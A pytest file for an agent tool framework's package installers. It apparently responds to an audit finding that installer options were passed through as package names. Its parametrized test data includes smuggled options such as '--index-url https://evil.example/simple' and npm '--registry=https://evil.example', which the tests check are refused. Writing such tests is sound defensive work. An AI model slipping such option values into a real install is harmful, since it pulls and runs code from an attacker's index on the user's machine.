"""``install_python_packages`` / ``install_npm_packages`` take packages, not
installer options, and the Python install names its interpreter (audit
2026-10-26 AUD-108).

The list went straight onto the installer's command line: ``--index-url
<host>``, ``-e <vcs url>``, ``-r file`` or npm's ``--registry`` were options
the approval card showed as "packages". And ``uv pip install`` with no
``--python`` picks the environment from the working directory -- the
workspace's own ``.venv`` -- not the runtime the tool says it installs into.
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

TOOLS = "kazma_skills.native.environment_bootstrapper.tools"


@pytest.fixture()
def ran(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> list[list[str]]:
    import importlib

    mod = importlib.import_module(TOOLS)
    calls: list[list[str]] = []

    async def fake_run(cmd: list[str], **_kw: Any) -> Any:
        calls.append(list(cmd))
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(mod, "run_off_loop", fake_run)
    monkeypatch.setattr(mod, "_get_workspace", lambda: tmp_path)
    return calls


@pytest.mark.parametrize("args", [
    ["requests", "--index-url", "https://evil.example/simple"],
    ["-e", "https://example.com/repo.zip"],
    ["-r", "requirements.txt"],
    [" --pre", "pandas"],
])
def test_an_option_is_refused_before_anything_runs(ran: list, args: list[str]) -> None:
    import importlib

    from kazma_core.agent.tool_refusal import RefusedBeforeEffect

    mod = importlib.import_module(TOOLS)
    with pytest.raises(RefusedBeforeEffect, match="option"):
        asyncio.run(mod.install_python_packages(args))
    with pytest.raises(RefusedBeforeEffect, match="option"):
        asyncio.run(mod.install_npm_packages(["lodash", "--registry=https://evil.example"]))
    assert ran == []


def test_uv_installs_into_kazmas_own_interpreter(monkeypatch: pytest.MonkeyPatch, ran: list) -> None:
    import importlib

    mod = importlib.import_module(TOOLS)
    monkeypatch.setattr(mod.shutil, "which", lambda name: "C:/bin/uv.exe" if name == "uv" else None)
    out = asyncio.run(mod.install_python_packages(["requests"]))
    assert out.startswith("Successfully installed")
    cmd = ran[0]
    assert cmd[:4] == ["C:/bin/uv.exe", "pip", "install", "--python"]
    interpreter = Path(cmd[4])
    assert interpreter.resolve().is_relative_to(Path(sys.prefix).resolve()) or str(interpreter) == sys.executable
    assert cmd[5:] == ["requests"]


def test_plain_package_specs_still_install(ran: list, monkeypatch: pytest.MonkeyPatch) -> None:
    import importlib

    mod = importlib.import_module(TOOLS)
    monkeypatch.setattr(mod.shutil, "which", lambda name: None)
    asyncio.run(mod.install_python_packages(["pandas==2.2", "requests[socks]"]))
    assert ran[0][-2:] == ["pandas==2.2", "requests[socks]"]
    assert ran[0][1:4] == ["-m", "pip", "install"]


def _old_check(packages: list[str]) -> bool:
    """The validation before AUD-108: metacharacters only."""
    return all(pkg and not any(c in pkg for c in ";|&<>`$()") for pkg in packages)


def test_negative_control_the_old_check_let_options_through() -> None:
    assert _old_check(["requests", "--index-url", "https://evil.example/simple"]) is True
